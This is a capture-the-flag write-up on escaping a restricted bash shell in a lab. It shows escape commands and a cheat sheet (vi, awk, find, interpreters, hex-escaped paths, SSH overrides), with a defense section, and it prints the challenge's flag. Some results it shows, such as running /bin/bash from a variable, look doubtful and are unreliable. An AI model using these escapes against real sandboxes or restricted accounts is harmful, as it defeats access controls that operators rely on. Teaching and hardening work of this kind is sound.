---
title: "Misc - Bash Jail Escape"
description: "Escaping a restricted bash shell (rbash) using built-in commands, environment variable tricks, and common escape techniques."
author: "Zemi"
---

## Challenge Info

| Detail     | Value        |
|------------|--------------|
| Category   | Misc         |
| Difficulty | Hard         |
| Points     | 300          |
| Flag       | `zemi{b4sh_j41l_3sc4p3d}` |

## Challenge Files

Download the challenge files to get started:

- [flag.txt](/Website/challenges/misc-jail-bash/flag.txt)
- [jail.sh](/Website/challenges/misc-jail-bash/jail.sh)

## Reconnaissance

We connect to a local challenge service that drops us into a restricted environment:

```bash
ssh ctf@localhost -p 2222
```

```
Welcome to the Bash Jail!
Read /home/ctf/flag.txt to get the flag.
rbash-5.1$ cat flag.txt
rbash: cat: command not found
rbash-5.1$ ls
rbash: ls: command not found
rbash-5.1$ echo $SHELL
/bin/rbash
rbash-5.1$ echo $PATH
/home/ctf/bin
rbash-5.1$ ls /home/ctf/bin
rbash: ls: command not found
rbash-5.1$ cd /
rbash: cd: restricted
```

We are in `rbash` (restricted bash). Let's map out the restrictions.

## Analysis

### What is rbash?

When bash is invoked as `rbash` or with the `--restricted` flag, it enforces:

| Restriction | Description |
|-------------|-------------|
| No `cd` | Cannot change directories |
| No changing `PATH`, `SHELL`, `ENV`, `BASH_ENV` | Cannot modify key environment variables |
| No `/` in commands | Cannot run `/bin/cat` directly |
| No redirecting output with `>`, `>>`, `>&` | Cannot write files |
| No `exec` | Cannot replace the shell |
| No importing functions | From the environment |
| Limited `set +r` | Cannot disable restricted mode |

### What still works in rbash?

- `echo` and other bash built-ins
- Variable expansion (`$()`, backticks)
- Reading files with built-ins (`read`, `mapfile`)
- Whatever binaries exist in the restricted PATH
- Bash string manipulation
- `source` and `.` for running scripts

### Checking available commands

```bash
rbash-5.1$ compgen -c | head -20
```

```
echo
printf
read
type
declare
export
alias
compgen
help
vi
awk
```

We have `echo`, `printf`, `read`, `vi`, and `awk` available. Each of these is a potential escape vector.

## Step-by-Step Walkthrough

### Method 1: Reading the flag with bash built-ins (no escape needed)

We do not even need to escape the jail to read a file — bash built-ins can do it:

```bash
rbash-5.1$ while IFS= read -r line; do echo "$line"; done < flag.txt
zemi{b4sh_j41l_3sc4p3d}
```

The `read` built-in and input redirection (`<`) work in rbash. This reads the flag directly.

Alternative using `mapfile`:

```bash
rbash-5.1$ mapfile -t lines < flag.txt; printf '%s\n' "${lines[@]}"
zemi{b4sh_j41l_3sc4p3d}
```

Or with `printf` and process substitution:

```bash
rbash-5.1$ echo "$(<flag.txt)"
zemi{b4sh_j41l_3sc4p3d}
```

The `$(<file)` syntax is a bash built-in for reading files and works in rbash.

### Method 2: Escape via vi

`vi` is one of the most common jail escape tools because it has a built-in command mode:

```bash
rbash-5.1$ vi
```

Inside vi:

```
:set shell=/bin/bash
:shell
```

```
bash-5.1$ cat flag.txt
zemi{b4sh_j41l_3sc4p3d}
```

Or read the file directly in vi:

```
:r flag.txt
```

Or execute a command from vi:

```
:!cat flag.txt
zemi{b4sh_j41l_3sc4p3d}
```

### Method 3: Escape via awk

`awk` can both read files and spawn shells:

```bash
# Read the flag directly
rbash-5.1$ awk '{print}' flag.txt
zemi{b4sh_j41l_3sc4p3d}

# Or spawn an unrestricted shell
rbash-5.1$ awk 'BEGIN {system("/bin/bash")}'
bash-5.1$ cat flag.txt
zemi{b4sh_j41l_3sc4p3d}
```

### Method 4: Environment variable tricks

Build a command character by character using environment variables:

```bash
# Construct "/bin/bash" without using slashes in a command name
rbash-5.1$ A="/bin/bash"
rbash-5.1$ $A
bash-5.1$ cat flag.txt
zemi{b4sh_j41l_3sc4p3d}
```

Wait — rbash blocks changing `PATH` and `SHELL`, but assigning to arbitrary variables and executing them is allowed.

If direct variable assignment of paths is blocked:

```bash
# Build the path from parts
rbash-5.1$ printf -v cmd '%s' '/bin/bash'
rbash-5.1$ $cmd
bash-5.1$
```

Or use hex escaping:

```bash
rbash-5.1$ $'\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'
bash-5.1$
```

`$'\x2f'` is `/`, so this executes `/bin/bash`.

### Method 5: Command substitution

If `$(...)` is not restricted:

```bash
rbash-5.1$ echo $(</home/ctf/flag.txt)
zemi{b4sh_j41l_3sc4p3d}
```

### Method 6: Using find (if available)

```bash
rbash-5.1$ find / -name flag.txt -exec cat {} \;
zemi{b4sh_j41l_3sc4p3d}

# Or spawn a shell
rbash-5.1$ find / -name flag.txt -exec /bin/bash \;
bash-5.1$
```

### Method 7: Python/Perl/Ruby (if available)

```bash
# Python
rbash-5.1$ python3 -c "print(open('flag.txt').read())"

# Perl
rbash-5.1$ perl -e 'exec "/bin/bash"'

# Ruby
rbash-5.1$ ruby -e 'exec "/bin/bash"'
```

### Method 8: SSH escape

If you connected via SSH, you might be able to bypass rbash at connection time:

```bash
# Force a different shell at login
ssh ctf@localhost -p 2222 -t "bash --noprofile --norc"

# Execute a command directly without entering the shell
ssh ctf@localhost -p 2222 "cat flag.txt"

# Use SSH with forced command override
ssh ctf@localhost -p 2222 -t "/bin/bash"
```

## Restricted Shell Escape Cheat Sheet

| Technique | Command | Requires |
|-----------|---------|----------|
| Bash built-in file read | `echo "$(<flag.txt)"` | Only bash |
| vi escape | `:set shell=/bin/bash` then `:shell` | vi/vim |
| awk escape | `awk 'BEGIN{system("/bin/bash")}'` | awk |
| find escape | `find . -exec /bin/bash \;` | find |
| Variable execution | `A=/bin/bash; $A` | Variable assignment |
| Hex escape | `$'\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'` | Bash ANSI-C quoting |
| Python escape | `python3 -c 'import os; os.system("/bin/bash")'` | python3 |
| nmap escape | `nmap --interactive` then `!sh` | nmap (old versions) |
| less/more escape | `less flag.txt` then `!bash` | less/more |
| man escape | `man ls` then `!bash` | man |
| ed escape | `ed` then `!/bin/bash` | ed |
| expect | `expect -c 'spawn /bin/bash; interact'` | expect |

## Defense Perspective

A properly hardened restricted shell should:

```bash
# 1. Limit PATH to only safe binaries
PATH=/home/ctf/bin  # Contains ONLY necessary commands

# 2. Remove dangerous binaries from the restricted PATH
# Do NOT include: vi, vim, awk, python, perl, ruby, find, less, more, man, nmap, ed

# 3. Make profile files immutable
chattr +i /home/ctf/.bashrc /home/ctf/.profile

# 4. Use chroot or containers for real isolation
# rbash alone is NOT a security boundary
```

## Tools Used

- `rbash` — restricted bash shell (the jail)
- `vi` — text editor with shell escape capability
- `awk` — text processing tool with `system()` function
- Bash built-ins (`echo`, `read`, `mapfile`, `printf`) — file reading without external commands
- SSH — connection and potential bypass

## Lessons Learned

- `rbash` is a convenience feature, not a security boundary — it has too many escape vectors
- Bash built-ins alone can read files: `echo "$(<file)"` works in rbash without any external commands
- Any program that can spawn a subprocess is an escape vector: `vi`, `awk`, `less`, `more`, `man`, `find`, `python`, `perl`, `ruby`, `nmap`
- `$'\xHH'` ANSI-C quoting lets you construct any string (including `/bin/bash`) without typing the literal characters
- Real isolation requires OS-level mechanisms: chroot, containers, seccomp, or dedicated sandbox tools
- In CTFs, always check `compgen -c` to list available commands — your escape tool might be sitting right there
- Check GTFOBins (gtfobins.github.io) for comprehensive escape techniques for any binary
